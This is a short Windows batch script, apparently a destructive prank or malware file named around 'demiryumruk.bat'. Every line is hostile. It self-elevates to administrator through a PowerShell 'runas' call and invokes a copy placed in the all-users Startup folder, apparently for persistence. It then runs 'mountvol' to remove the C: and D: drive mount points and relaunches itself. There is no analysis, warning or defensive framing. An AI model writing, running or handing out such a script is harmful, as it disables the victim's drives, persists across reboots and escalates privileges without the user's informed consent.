@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
WScript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\demiryumruk.bat"
mountvol c: /d
mountvol d: /d
start demiryumruk.bat
pause

